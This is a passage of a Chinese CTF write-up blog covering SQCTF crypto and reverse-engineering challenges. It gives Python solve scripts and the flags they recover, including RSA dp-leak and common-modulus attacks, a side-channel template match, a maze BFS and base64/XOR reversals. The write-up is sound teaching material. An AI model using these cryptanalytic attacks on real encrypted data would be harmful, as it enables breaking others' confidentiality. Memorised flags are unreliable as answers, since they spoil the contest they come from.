class="line">shared = scalar_mult(secret, C1)</span><br><span class="line">M = point_add(C2, point_neg(shared))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] M =&quot;</span>, M)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] x + y =&quot;</span>, M[<span class="number">0</span>] + M[<span class="number">1</span>])</span><br><span class="line"><span class="comment"># [+] x + y = 5720914</span></span><br><span class="line"><span class="comment"># 所以flag为：SQCTF&#123;5720914&#125;</span></span><br></pre></td></tr></table></figure><h3 id="密室逃脱的终极挑战"><a href="#密室逃脱的终极挑战" class="headerlink" title="密室逃脱的终极挑战"></a>密室逃脱的终极挑战</h3><p>用IDA打开就能看到flag</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-3.png"></p><h3 id="玩的挺变态啊清茶哥"><a href="#玩的挺变态啊清茶哥" class="headerlink" title="玩的挺变态啊清茶哥"></a>玩的挺变态啊清茶哥</h3><p>用随波逐流找编码图，对照打出来就行</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-4.png"></p><h3 id="丢三落四的小I"><a href="#丢三落四的小I" class="headerlink" title="丢三落四的小I"></a>丢三落四的小I</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">n = <span class="number">15124759435262214519214613181859115868729356369274819299240157375966724674496904855757710168853212365134058977781083245051947523020090726851248565503324715984500225724227315777864292625995636236219359256979887906731659848125792269869019299002807101443623257106289957747665586226912446158316961637444556237354422346621287535139897525295200592525427472329815100310702255593134984040293233780616515067333512830391860868933632383433431739823740865023004008736555299772442805617275890761325372253913686933294732259451820332316315205537055439515569011020072762809613676347686279082728000419370190242778504490370698336750029</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">dp = <span class="number">1489209342944820124277807386023133257342259912189247976569642906341314682381245025918040456151960704964362424182449567071683886673550031774367531511627163525245627333820636131483140111126703748875380337657189727259902108519674360217456431712478937900720899137512461928967490562092139439552174099755422092113</span></span><br><span class="line">c = <span class="number">4689152436960029165116898717604398652474344043493441445967744982389466335259787751381227392896954851765729985316050465252764336561481633355946302884245320441956409091576747510870991924820104833541438795794034004988760446988557417649875106251230110075290880741654335743932601800868983384563972124570013568709773861592975182534005364811768321753047156781579887144279837859232399305581891089040687565462656879173423137388006332763262703723086583056877677285692440970845974310740659178040501642559021104100335838038633269766591727907750043159766170187942739834524072423767132738563238283795671395912593557918090529376173</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_p</span>(<span class="params">e, dp, n</span>):</span><br><span class="line">    edp = e * dp</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> (edp - <span class="number">1</span>) % k == <span class="number">0</span>:</span><br><span class="line">            p_candidate = (edp - <span class="number">1</span>) // k + <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> p_candidate != <span class="number">0</span> <span class="keyword">and</span> n % p_candidate == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> p_candidate</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">p = find_p(e, dp, n)</span><br><span class="line">q = n // p</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">flag = long_to_bytes(m).decode()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, flag)</span><br><span class="line"><span class="comment"># Flag: SQCTF&#123;7b909221-c8ff-f391-0c86-d3a9ca8491d1&#125;</span></span><br></pre></td></tr></table></figure><h3 id="ez-SCA"><a href="#ez-SCA" class="headerlink" title="ez_SCA"></a>ez_SCA</h3><p>在这里找到原题：<a href="https://blog.csdn.net/xuruihan177/article/details/139519433">https://blog.csdn.net/xuruihan177/article/details/139519433</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> scipy.spatial.distance <span class="keyword">import</span> euclidean</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载能量轨迹文件</span></span><br><span class="line">traces = np.load(<span class="string">&#x27;energy_traces_with_flag.npy&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载模板轨迹文件</span></span><br><span class="line">template_trace_0 = np.load(<span class="string">&#x27;template_trace_0.npy&#x27;</span>)</span><br><span class="line">template_trace_1 = np.load(<span class="string">&#x27;template_trace_1.npy&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 恢复私钥（明文 flag 的二进制形式）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recover_private_key</span>(<span class="params">traces, template_trace_0, template_trace_1</span>):</span><br><span class="line">    private_key = []</span><br><span class="line">    <span class="keyword">for</span> trace <span class="keyword">in</span> traces:</span><br><span class="line">        <span class="comment"># 计算轨迹与两个模板轨迹的欧几里得距离</span></span><br><span class="line">        dist_0 = euclidean(trace, template_trace_0)</span><br><span class="line">        dist_1 = euclidean(trace, template_trace_1)</span><br><span class="line">        <span class="comment"># 选择距离较小的模板轨迹对应的比特位</span></span><br><span class="line">        private_key.append(<span class="number">0</span> <span class="keyword">if</span> dist_0 &lt; dist_1 <span class="keyword">else</span> <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> private_key</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将恢复的二进制形式转换为明文 flag</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bits_to_text</span>(<span class="params">bits</span>):</span><br><span class="line">    chars = [bits[i:i+<span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bits), <span class="number">8</span>)]</span><br><span class="line">    text = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(<span class="built_in">int</span>(char, <span class="number">2</span>)) <span class="keyword">for</span> char <span class="keyword">in</span> chars])</span><br><span class="line">    <span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line"><span class="comment"># 恢复私钥并转换为明文</span></span><br><span class="line">private_key = recover_private_key(traces, template_trace_0, template_trace_1)</span><br><span class="line">recovered_bits_str = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, private_key))</span><br><span class="line">recovered_plaintext = bits_to_text(recovered_bits_str)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Recovered plaintext: <span class="subst">&#123;recovered_plaintext&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># Recovered plaintext: SQCTF&#123;easy_funny_and_not_hard_sca_hhh_just_kingdding&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Common-Modulus"><a href="#Common-Modulus" class="headerlink" title="Common Modulus"></a>Common Modulus</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s</span><br><span class="line"></span><br><span class="line">n = <span class="number">13650503560233612352420237787159267432351878281073422449253560365809461612884248041710373755322100953953257608601227381211434513766352420535096028618735289379355710140356003114010103377509526452574385251495847301426845768427018504464757671958803807138699056193259160806476941875860254288376872925837127208612702688503022494109785623082365323949385021488106289708499091818714253710552213982060745736652306892896670424179736886691685639988637188591805479432332714690818805432648223229601082431517091667297328748597580733946557364100555781113940729296951594110258088501146224322799560159763097710814171619948719257894889</span></span><br><span class="line">c1 = <span class="number">3366500968116867439746769272799247895217647639427183907930755074259056811685671593722389247697636905214269760325119955242254171223875159785479900114989812511815466122321484289407596620307636198001794029251197349257235827433633936216505458557830334779187112907940003978773672225479445837897135907447625387990203145231671233038707457396631770623123809080945314083730185110252441203674945146889165953135351824739866177205127986576305492490242804571570833778440870959816207461376598067538653432472043116027057204385251674574207749241503571444801505084599753550983430739025050926400228758055440679102902069032768081393253</span></span><br><span class="line">c2 = <span class="number">7412517103990148893766077090616798338451607394614015195336719617426935439456886251056015216979658274633552687461145491779122378237012106236527924733047395907133190110919550491029113699835260675922948775568027483123730185809123757000207476650934095553899548181163223066438602627597179560789761507989925938512977319770704123979102211869834390476278761480516444396187746843654541476645830961891622999425268855097938496239480682176640906218645450399785130931214581370821403077312842724336393674718200919934701268397883415347122906912693921254353511118129903752832950063164459159991128903683711317348665571285175839274346</span></span><br><span class="line">e1 = <span class="number">4217054819</span></span><br><span class="line">e2 = <span class="number">2800068527</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算扩展欧几里得算法得到s和t</span></span><br><span class="line">gcd, s, t = gmpy2.gcdext(e1, e2)</span><br><span class="line"><span class="keyword">assert</span> gcd == <span class="number">1</span>, <span class="string">&quot;e1 和 e2 不互质，无法进行共模攻击&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理负数指数的情况</span></span><br><span class="line"><span class="keyword">if</span> s &lt; <span class="number">0</span>:</span><br><span class="line">    c1 = gmpy2.invert(c1, n)</span><br><span class="line">    s = -s</span><br><span class="line"><span class="keyword">if</span> t &lt; <span class="number">0</span>:</span><br><span class="line">    c2 = gmpy2.invert(c2, n)</span><br><span class="line">    t = -t</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算明文</span></span><br><span class="line">m = (<span class="built_in">pow</span>(c1, s, n) * <span class="built_in">pow</span>(c2, t, n)) % n</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换为字节并输出</span></span><br><span class="line"><span class="built_in">print</span>(n2s(<span class="built_in">int</span>(m)).decode())</span><br><span class="line"><span class="comment"># SQCTF&#123;06774dcf-b9d1-3c2d-8917-7d2d86b6721c&#125;</span></span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a><font style="color:rgb(238, 238, 238);"></h3><p></font>你的天赋是什么<br><img src="https://img.beiko.top/blog/2025/4/28/image-5.png"></p><h3 id="《1789年的密文》"><a href="#《1789年的密文》" class="headerlink" title="《1789年的密文》"></a>《1789年的密文》</h3><p>浏览器搜找到了来着Bugku的原题：<a href="https://www.cnblogs.com/0yst3r-2046/p/11810574.html">https://www.cnblogs.com/0yst3r-2046/p/11810574.html</a></p><p>改改对应脚本内的密钥运行即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#秘钥</span></span><br><span class="line">key=<span class="string">&quot;4,2,11,8,9,12,3,6,10,14,1,5,7,13&quot;</span></span><br><span class="line"><span class="comment">#密文</span></span><br><span class="line">cipher_text = <span class="string">&quot;UNEHJPBIUOMAVZ&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>)</span><br><span class="line">str_first_encry = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">    line = line.strip()</span><br><span class="line">    str_first_encry.append(line)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key_index = key.split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">str_second_encry=[]</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> key_index:</span><br><span class="line">    str_second_encry.append(str_first_encry[<span class="built_in">int</span>(k)-<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">print</span>(str_first_encry[<span class="built_in">int</span>(k)-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i,ch <span class="keyword">in</span> <span class="built_in">enumerate</span>(cipher_text):</span><br><span class="line">    line = str_second_encry[i]</span><br><span class="line">    split_index = line.index(ch)</span><br><span class="line">    temp=[]</span><br><span class="line">    temp[<span class="number">0</span>:<span class="built_in">len</span>(line)-split_index+<span class="number">1</span>] = line[split_index:<span class="built_in">len</span>(line)]</span><br><span class="line">    temp[<span class="built_in">len</span>(temp):] = line[<span class="number">0</span>:split_index]</span><br><span class="line">    str_second_encry[i] = <span class="string">&quot;&quot;</span>.join(temp)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-------------------------------------&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> plain <span class="keyword">in</span> str_second_encry:</span><br><span class="line">    <span class="built_in">print</span>(plain)</span><br></pre></td></tr></table></figure><p><img src="https://img.beiko.top/blog/2025/4/28/image-6.png"></p><p>一个一个试出来<code>SQCTF&#123;maketysecgreat&#125;</code></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="ezRe（三血）"><a href="#ezRe（三血）" class="headerlink" title="ezRe（三血）"></a>ezRe（三血）</h3><p>解压出来就看到是经典Python打包程序</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-7.png"></p><p>常规python逆向即可</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-8.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Source Generated with Decompyle++</span></span><br><span class="line"><span class="comment"># File: 33.pyc (Python 3.9)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">encoded_flag = <span class="string">&#x27;NWVkMmJlNDUtMmU4My00OGQyLWI2MzEtYzA4OGU1MWVlOTY0&#x27;</span></span><br><span class="line">flag = base64.b64decode(encoded_flag).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># 5ed2be45-2e83-48d2-b631-c088e51ee964</span></span><br></pre></td></tr></table></figure><h3 id="慕然回首，那人却在灯火阑珊处"><a href="#慕然回首，那人却在灯火阑珊处" class="headerlink" title="慕然回首，那人却在灯火阑珊处"></a>慕然回首，那人却在灯火阑珊处</h3><p>无壳，直接扔IDA</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-9.png"></p><p>一个简单的迷宫游戏，从S移动到终点E，地图大小为<code>10*10</code></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-10.png"></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-11.png"></p><p>写个代码自动寻路并找到最短路径即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line"></span><br><span class="line"><span class="comment"># 组合迷宫字符串（注意迷宫总共 100 个字符，10x10）</span></span><br><span class="line">maze_str = (</span><br><span class="line">    <span class="string">&quot;S**#########*########**#########**#########*###**##***###**##*###&quot;</span> +</span><br><span class="line">    <span class="string">&quot;##**##*#####*E##*******############&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 迷宫尺寸</span></span><br><span class="line">rows, cols = <span class="number">10</span>, <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据行列索引访问迷宫字符的函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_cell</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="keyword">return</span> maze_str[x * cols + y]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找起点和终点坐标</span></span><br><span class="line">start = end = <span class="literal">None</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(rows):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(cols):</span><br><span class="line">        <span class="keyword">if</span> get_cell(x, y) == <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line">            start = (x, y)</span><br><span class="line">        <span class="keyword">elif</span> get_cell(x, y) == <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line">            end = (x, y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> start <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> end <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;未找到起点或终点&quot;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义移动及对应的指令，注意坐标变换 (x, y)</span></span><br><span class="line">moves = &#123;</span><br><span class="line">    <span class="string">&#x27;w&#x27;</span>: (-<span class="number">1</span>, <span class="number">0</span>),  <span class="comment"># 上</span></span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>: (<span class="number">0</span>, -<span class="number">1</span>),  <span class="comment"># 左</span></span><br><span class="line">    <span class="string">&#x27;s&#x27;</span>: (<span class="number">1</span>, <span class="number">0</span>),   <span class="comment"># 下</span></span><br><span class="line">    <span class="string">&#x27;d&#x27;</span>: (<span class="number">0</span>, <span class="number">1</span>)    <span class="comment"># 右</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># BFS 查找最短路径，记录前驱信息以便重构路径</span></span><br><span class="line">queue = deque([start])</span><br><span class="line">visited = &#123;start: <span class="literal">None</span>&#125;  <span class="comment"># key: 当前坐标，value: (前驱坐标, 移动指令)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> queue:</span><br><span class="line">    cur = queue.popleft()</span><br><span class="line">    <span class="keyword">if</span> cur == end:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> move, (dx, dy) <span class="keyword">in</span> moves.items():</span><br><span class="line">        nx, ny = cur[<span class="number">0</span>] + dx, cur[<span class="number">1</span>] + dy</span><br><span class="line">        <span class="comment"># 检查边界和是否为墙（墙用 &#x27;#&#x27; 表示）</span></span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> &lt;= nx &lt; rows <span class="keyword">and</span> <span class="number">0</span> &lt;= ny &lt; cols <span class="keyword">and</span> get_cell(nx, ny) != <span class="string">&#x27;#&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> (nx, ny) <span class="keyword">not</span> <span class="keyword">in</span> visited:</span><br><span class="line">                visited[(nx, ny)] = (cur, move)</span><br><span class="line">                queue.append((nx, ny))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果终点在 visited 中，则重构路径</span></span><br><span class="line"><span class="keyword">if</span> end <span class="keyword">not</span> <span class="keyword">in</span> visited:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;未能找到路径&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    path_moves = []</span><br><span class="line">    cur = end</span><br><span class="line">    <span class="keyword">while</span> cur != start:</span><br><span class="line">        prev, move = visited[cur]</span><br><span class="line">        path_moves.append(move)</span><br><span class="line">        cur = prev</span><br><span class="line">    path_moves.reverse()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输出路径移动指令</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;最短路径移动指令：&quot;</span>, <span class="string">&quot;&quot;</span>.join(path_moves))</span><br><span class="line"><span class="comment"># ddsssdssaasssddddddwd</span></span><br></pre></td></tr></table></figure><h3 id="鹅鹅鹅，曲项向天歌"><a href="#鹅鹅鹅，曲项向天歌" class="headerlink" title="鹅鹅鹅，曲项向天歌"></a>鹅鹅鹅，曲项向天歌</h3><p>还是熟悉的图标</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-12.png"></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-13.png"></p><p>写个脚本逆向出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_flag</span>():</span><br><span class="line">    ciphertext = <span class="string">&#x27;itd~tzw_know_sanmenxbZ8&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 拆分加密文本</span></span><br><span class="line">    part2_1_enc = ciphertext[:<span class="number">7</span>]        <span class="comment"># &#x27;itd~tzw&#x27;</span></span><br><span class="line">    part2_2_enc = ciphertext[<span class="number">7</span>:<span class="number">20</span>]      <span class="comment"># &#x27;_know_sanmen&#x27;</span></span><br><span class="line">    part2_3_enc = ciphertext[<span class="number">20</span>:]       <span class="comment"># &#x27;xbZ&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解密对应部分</span></span><br><span class="line">    part2_1 = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(<span class="built_in">ord</span>(c) - <span class="number">5</span>) <span class="keyword">for</span> c <span class="keyword">in</span> part2_1_enc])</span><br><span class="line">    part2_2 = part2_2_enc</span><br><span class="line">    part2_3 = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(<span class="built_in">ord</span>(c) + <span class="number">7</span>) <span class="keyword">for</span> c <span class="keyword">in</span> part2_3_enc])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 拼接得到最终 flag</span></span><br><span class="line">    part2 = part2_1 + part2_2 + part2_3</span><br><span class="line">    flag = <span class="string">f&quot;flag&#123;&#123;<span class="subst">&#123;part2&#125;</span>&#125;&#125;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line">decrypt_flag()</span><br><span class="line"><span class="comment"># flag&#123;do_your_know_sanmenxia?&#125;</span></span><br></pre></td></tr></table></figure><h3 id="圣人当仁不让"><a href="#圣人当仁不让" class="headerlink" title="圣人当仁不让"></a>圣人当仁不让</h3><p>无壳，直接扔IDA</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-14.png"></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-15.png"></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-16.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_input</span>():</span><br><span class="line">    <span class="comment"># 目标Base64编码字符串</span></span><br><span class="line">    target_b64 = <span class="string">&quot;/P7sAe/U0s7c1vjb0vjfyt==&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1. Base64解码得到16字节数据</span></span><br><span class="line">    decoded_bytes = base64.b64decode(target_b64)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 逆向操作：先减3再异或0xAA（抵消vm_execute的加3和异操作）</span></span><br><span class="line">    xor_key = <span class="number">0xAA</span></span><br><span class="line">    reversed_data = <span class="built_in">bytes</span>([((b - <span class="number">3</span>) &amp; <span class="number">0xFF</span>) ^ xor_key <span class="keyword">for</span> b <span class="keyword">in</span> decoded_bytes])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. 构造17字节输入（末尾补\x00）</span></span><br><span class="line">    input_bytes = reversed_data + <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> input_bytes.decode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate_solution</span>(<span class="params">input_str</span>):</span><br><span class="line">    <span class="comment"># 模拟vm_execute操作：异或0xAA后加3</span></span><br><span class="line">    processed_data = <span class="built_in">bytes</span>([</span><br><span class="line">        ((<span class="built_in">ord</span>(c) ^ <span class="number">0xAA</span>) + <span class="number">3</span>) &amp; <span class="number">0xFF</span> </span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> input_str[:-<span class="number">1</span>]  <span class="comment"># 前16字节处理</span></span><br><span class="line">    ]) + <span class="string">b&#x27;\x00&#x27;</span>  <span class="comment"># 第17字节未参与有效编码</span></span><br><span class="line">    encoded_check = base64.b64encode(processed_data[:<span class="number">16</span>]).decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> encoded_check</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 逆向生成输入</span></span><br><span class="line">    solution = reverse_input()</span><br><span class="line">    <span class="built_in">print</span>(<span 